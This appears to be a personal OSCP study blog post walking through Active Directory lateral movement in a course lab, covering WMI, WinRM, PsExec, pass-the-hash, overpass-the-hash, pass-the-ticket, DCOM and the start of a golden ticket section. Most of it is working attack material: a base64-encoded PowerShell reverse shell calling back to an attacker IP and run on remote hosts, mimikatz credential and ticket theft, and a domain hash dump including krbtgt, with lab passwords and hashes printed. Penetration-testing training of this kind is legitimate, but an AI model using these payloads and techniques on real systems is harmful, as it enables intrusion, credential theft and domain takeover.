---
title: Lateral Movement in Active Directory
date: 2024-04-023 02:14:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Lateral Movement in Active Directory tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Lateral Movement in Active Directory

Let's explore different lateral movement techniques that allow us to authenticate to a system and gain code execution using a user's hash or a Kerberos ticket.

## Active Directory Lateral Movement Techniques

### WMI and WinRM

Windows Management Instrumentation (WMI) facilitates task automation and can use the Create method from the Win32_Process class. It communicates thru Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

To create a process on the remote target via WMI, we need the credentials of a member of the Administrators local group, which can also be a domain user.

```console
kali$ xfreerdp /cert-ignore /u:jeff /d:corp.com /v:192.168.177.74 /drive:shared,/tmp

// test, launch calculator

jeff> wmic /node:192.168.177.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 2100;
        ReturnValue = 0;
};

// If we were logged in on that machine and monitoring Task Manager we would see the win32calc.exe process appear with jen as the user.

jeff> $username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

// create CIM using target IP

jeff> $options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.177.73 -Credential $credential -SessionOption $Options 
$command = 'calc';

jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     1384           0 192.168.177.73

// verify the process is running on the target machine with Task Maanger
```

We can improve this by replacing this payload with a full reverse shell. Replace the IP with the IP and port of the Kali attacker machine.

```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.226",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Save this Python script in Kali.

```console
kali$ nano encode.py
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.226",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

kali$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

// set up listener

$ nc -nlvp 443

PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.177.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
...

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

kali$ nc -nlvp 443           
listening on [any] 443 ...
connect to [192.168.45.226] from (UNKNOWN) [192.168.177.73] 55087
hostname
FILES04
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> 
```

As an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP. In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as winrs (Windows Remote Shell).

NOTE: For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

```console
jeff> winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen

// that confirmed we can run commands remotely on FILES04
// now try lateral movement

jeff> winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

kali$ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.45.226] from (UNKNOWN) [192.168.177.73] 55089
hostname
FILES04
PS C:\Users\jen> whoami
corp\jen
PS C:\Users\jen> 
```

PowerShell also has WinRM built-in capabilities called PowerShell remoting, which can be invoked via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.

```console
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.177.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.177.73  RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\jeff> Enter-PSSession 1
[192.168.177.73]: PS C:\Users\jen\Documents> whoami
corp\jen
[192.168.177.73]: PS C:\Users\jen\Documents> hostname
FILES04
```

### PsExec

PsExec is part of SysInternals intended to replace telnet-like apps and provide remote execution of processes on other systems thru an interactive console. To use for lateral movement:

1. User that authenticates to the target needs to be part of the Administrators local group
2. ADMIN$ share must be available
3. File and Printer Sharing must be turned on

The last two requirements are default for Windows Servers.

NOTE: you should avoid using the domain flag (-d) for RDP if the user has local admin privileges.

You probably need to transfer PsExec onto the compromised machine.

```console
// start an interactive session on the remote host

PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```

### Pass the Hash

Note that this will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication.

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including:
- PsExec from Metasploit
- Passing-the-hash toolkit
- Impacket

Three requirements:
1. Need an SMB connection thru the firewall (often port 445)
2. Windows File and Printer Sharing feature needs to be enabled
3. ADMIN$ share must be available

We are going to invoke the command by passing the local Administrator hash that we gathered previously.

```console
kali$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.177.73
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```

If the target was sitting behind a network that was only reachable through our initial compromised access, we could perform this very same attack by pivoting and proxying through the first host as learned previously.

This method works for Active Directory domain accounts and the built-in local administrator account. However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account.

### Overpass the Hash

With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).

Assume you already compromised a workstation or server that jen has authenticated too, so the machine is now caching her creds and NTLM password hash. We'll log in to the Windows 10 CLIENT76 machine as jeff and run a process as jen, which prompts authentication.

Shift + right click the Notepad icon on the desktop and Run As Different User. After you auth, jen's creds are cached on the machine.

```console
// enter Admin PS
PS> .\mimikatz.exe

mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
[00000003] Primary
         * Username : jen
         * Domain   : CORP
         * NTLM     : 369def79d8372408bf6e93364cc93075

// turn jen's NTLM hash into a kerberos ticket

mimikatz# sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  2824
  |  TID  4584
  |  LSA Process is now R/W
  |  LUID 0 ; 2162675 (00000000:0020fff3)
  \_ msv1_0   - data copy @ 000002105B112E10 : OK !
  \_ kerberos - data copy @ 000002105B1F84F8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000002105B27CDA8 (32) -> null
```

A new PowerShell window should open as jen. At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets

In the new jen shell:

```console
PS> klist

Current LogonId is 0:0x20fff3

Cached Tickets: (0)

// no cached tickets yet, generate a TGT by authenticating to a network share

PS> net use \\files04

PS> klist
Current LogonId is 0:0x20fff3

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/23/2024 16:42:13 (local)
        End Time:   4/24/2024 2:42:13 (local)
        Renew Time: 4/30/2024 16:42:13 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/23/2024 16:42:13 (local)
        End Time:   4/24/2024 2:42:13 (local)
        Renew Time: 4/30/2024 16:42:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

The output has the Kerberos tickets, including the TGT and a TGS for the Common Internet File System (CIFS) service. We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.

We know that ticket #0 is a TGT because the server is krbtgt.

Now we can use any tools that rely on Kerberos instead of NTLM.

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we can reuse the TGT to obtain code execution on the files04 host.

```console
PS> cd C:\tools\SysinternalsSuite\

PS> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```

We have successfully reused the Kerberos TGT to launch a command shell on the files04 server.

### Pass the Ticket

The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

Imagine we already have a session as jen and there's an existing session for dave, who has privileged access to the backup folder on WEB04.

We are going to extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.

```console
kali$ xfreerdp /cert-ignore /u:jen /v:192.168.214.76 /drive:shared,/tmp
Password: 

// see that jen doesn't have access to \\web04\backup

PS C:\Users\jen> ls \\web04\backup
ls : Access is denied

PS C:\Tools> .\mimikatz.exe

mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export
Authentication Id : 0 ; 2037286 (00000000:001f1626)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 6:24:17 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
...

// above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format
// dave had initiated a session. We can try to inject one of their tickets inside jen's sessions.

// verify newly generated tickets with dir, filtering out on the kirbi extension

PS> dir *.kirbi
Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/24/2024   4:30 PM           1601 [0;1035db]-0-0-40a50000-jen@LDAP-DC1.corp.com.kirbi
-a----        4/24/2024   4:30 PM           1511 [0;1035db]-2-0-40e10000-jen@krbtgt-CORP.COM.kirbi
-a----        4/24/2024   4:30 PM           1567 [0;1036a0]-0-0-40a10000-jen@cifs-web04.kirbi
-a----        4/24/2024   4:30 PM           1511 [0;1036a0]-2-0-40e10000-jen@krbtgt-CORP.COM.kirbi
-a----        4/24/2024   4:25 PM           1577 [0;158c67]-0-0-40810000-dave@cifs-web04.kirbi

// many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz

mimikatz # kerberos::ptt [0;158c67]-0-0-40810000-dave@cifs-web04.kirbi
* File: '[0;158c67]-0-0-40810000-dave@cifs-web04.kirbi': OK

PS C:\Tools> klist
Current LogonId is 0:0x1035db

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM          // !!!
        Server: cifs/web04 @ CORP.COM    // !!!
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 4/24/2024 16:18:35 (local)
        End Time:   4/25/2024 2:18:35 (local)
        Renew Time: 5/1/2024 16:18:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

// dave's ticket has been imported to our own session for jen
// now we have access to the folder!!

PS C:\Tools> ls \\web04\backup
 Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   5:52 AM              0 backup_schemata.txt
-a----        4/24/2024   4:15 PM             78 flag.txt
```

### DCOM

The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network. Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows the execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.

```console
kali$ xfreerdp /cert-ignore /u:jen /v:192.168.214.74 /drive:shared,/tmp

PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.214.73"))

PS> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

// now log onto .73

PS C:\Windows\system32> tasklist | findstr "calc"
win32calc.exe                 3512 Services                   0     12,128 K

// try for shell now

kali$ nc -nlvp 443

// on .74
PS> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")

// got shell from .73
kali$ nc -nlvp 443
connect to [192.168.45.226] from (UNKNOWN) [192.168.214.73] 55129
PS C:\Windows\system32> hostname
FILES04
PS C:\Windows\system32> whoami
corp\jen
```

## Active Directory Persistence

### Golden Ticket

When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt. If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets. , Golden Tickets provide a more powerful attack vector. While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources.

The best advantage is that the krbtgt account password is not automatically changed. This password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version.

!e will first attempt to laterally move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec as the jen user by spawning a traditional command shell with the cmd command, which should fail due to perms.

```console
kali$ xfreerdp /cert-ignore /u:jen /v:192.168.214.74 /drive:shared,/tmp

PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```

The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method. With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz. To simulate this, we'll log in to the domain controller with remote desktop using the jeffadmin account.

```console
kali$ xfreerdp /cert-ignore /u:jeffadmin /v:192.168.214.70 /drive:shared,/tmp

PS C:\Tools> .\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK


mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369 // look!!

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47 // look!!

RID  : 0000044f (1103)
User : dave
LM   :
NTLM : 08d7a47a6f9f66b97b1bae4178747494

RID  : 00000450 (1104)
User : stephanie
LM   :
NTLM : d2b35e8ac9d8f4ad5200acc4e0fd44fa

RID  : 00000451 (1105)
User : jeff
LM   :
NTLM : 2688c6d2af5e9c7ddb268899123744ea

RID  : 00000452 (1106)
User : jeffadmin
LM   :
NTLM : e460605a9dbd55097c6cf77af2f89a03

RID  : 00000455 (1109)
User : iis_service
LM   :
NTLM : 4d28cf5252d39971419580a51484ca09

RID  : 00000463 (1123)
User : pete
LM   :
NTLM : 369def79d8372408bf6e93364cc93075

RID  : 00000464 (1124)
User : jen
LM   :
NTLM : 369def79d8372408bf6e93364cc93075

RID  : 000003e8 (1000)
User : DC1$
LM   :
NTLM : 7869d0733dd7a6a60c58b6cae43c3535

RID  : 00000458 (1112)
User : WEB04$
LM   :
NTLM : 6ce7a763842704c39101fea70b77a6bc

RID  : 0000045e (1118)
User : FILES04$
LM   :
NTLM : 024e0b5bc4f09a8f909813e2c5041a2c

RID  : 00000461 (1121)
User : CLIENT74$
LM   :
NTLM : 31b5ed7d0a3a698d412c2d7d5aa2aca8

RID  : 00000462 (1122)
User : CLIENT75$
LM   :
NTLM : 83582e1d6c859ac47dc703bbe72bfe73

RID  : 00000469 (1129)
User : CLIENT76$
LM   :
NTLM : c06a3d3d9dfe4af367e7a2ea975274b7
```


